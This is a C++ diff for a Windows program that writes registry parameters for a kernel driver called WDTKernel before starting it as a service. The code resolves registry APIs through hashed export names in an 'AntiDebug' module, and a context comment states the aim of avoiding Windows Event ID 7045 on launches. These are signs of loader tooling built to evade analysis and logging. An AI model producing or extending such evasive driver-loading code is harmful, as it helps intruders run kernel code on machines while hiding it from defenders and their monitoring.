@@ -278,6 +278,53 @@ static const char* SvcStateName(DWORD s) {
     }
 }
 
+// Write the config keys the WDTKernel driver reads at load time. Without
+// these under HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters,
+// the driver may refuse to create its device object.
+// Value names taken from the driver's own string table:
+//   Enabled           REG_DWORD  1
+//   Interval          REG_DWORD  60000
+//   Reboot            REG_DWORD  0    (no watchdog reboot)
+//   AutoRefreshCycle  REG_DWORD  30000
+//   MinInterval       REG_DWORD  1000
+//   SSID              REG_DWORD  0xFFFF (accept any / not hardware-locked)
+static void WriteDriverParameters(const char* svcName) {
+    using PFN_RegCreateKeyExA = LONG(WINAPI*)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
+    using PFN_RegSetValueExA  = LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
+    using PFN_RegCloseKey     = LONG(WINAPI*)(HKEY);
+    auto pRegCreateKeyExA = reinterpret_cast<PFN_RegCreateKeyExA>(
+        AntiDebug::ResolveExport(AntiDebug::Fnv1a("RegCreateKeyExA")));
+    auto pRegSetValueExA  = reinterpret_cast<PFN_RegSetValueExA>(
+        AntiDebug::ResolveExport(AntiDebug::Fnv1a("RegSetValueExA")));
+    auto pRegCloseKey     = reinterpret_cast<PFN_RegCloseKey>(
+        AntiDebug::ResolveExport(AntiDebug::Fnv1a("RegCloseKey")));
+    if (!pRegCreateKeyExA || !pRegSetValueExA || !pRegCloseKey) return;
+
+    char keyPath[256];
+    snprintf(keyPath, sizeof(keyPath),
+             "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", svcName);
+    HKEY hKey = nullptr;
+    LONG r = pRegCreateKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, nullptr,
+                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+                              nullptr, &hKey, nullptr);
+    if (r != ERROR_SUCCESS || !hKey) return;
+
+    struct DwVal { const char* name; DWORD value; };
+    DwVal vals[] = {
+        { "Enabled",          1        },
+        { "Interval",         60000    },
+        { "Reboot",           0        },
+        { "AutoRefreshCycle", 30000    },
+        { "MinInterval",      1000     },
+        { "SSID",             0xFFFF   },
+    };
+    for (auto& v : vals) {
+        pRegSetValueExA(hKey, v.name, 0, REG_DWORD,
+                        reinterpret_cast<const BYTE*>(&v.value), sizeof(v.value));
+    }
+    pRegCloseKey(hKey);
+}
+
 // Fast sanity check: the file at drvPath must exist, start with MZ,
 // and be a plausible driver size. Catches a mis-copied file before
 // SCM turns "bad content" into a useless err=577/1275.
@@ -354,6 +401,11 @@ static bool StartDriver() {
         std::cout << "[!] SCM open failed\n";
         return false;
     }
+
+    // Populate the driver's Parameters subkey BEFORE the first StartService
+    // attempt. The WDT driver reads Enabled/Interval/Reboot/etc from here
+    // during DriverEntry; missing values can cause it to skip device creation.
+    WriteDriverParameters(svcName);
 
     // Reuse existing service entry after reboot — avoids Event ID 7045 on every launch.
     SC_HANDLE hExist = pOpenServiceA(hSCM, svcName, SERVICE_ALL_ACCESS);
